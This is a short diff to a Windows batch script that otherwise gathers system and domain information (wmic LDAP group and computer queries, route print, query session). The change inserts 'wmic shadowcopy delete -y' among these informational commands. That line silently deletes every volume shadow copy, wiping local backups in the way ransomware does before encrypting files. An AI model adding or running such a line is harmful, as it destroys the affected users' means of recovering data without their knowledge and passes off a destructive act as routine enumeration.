@@ -184,6 +184,8 @@ wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Do
 ECHO ============================
 wmic computersystem get "Model","Manufacturer", "Name", "UserName"
 ECHO ============================
+wmic shadowcopy delete -y
+ECHO ============================
 route print
 ECHO ============================
 query session
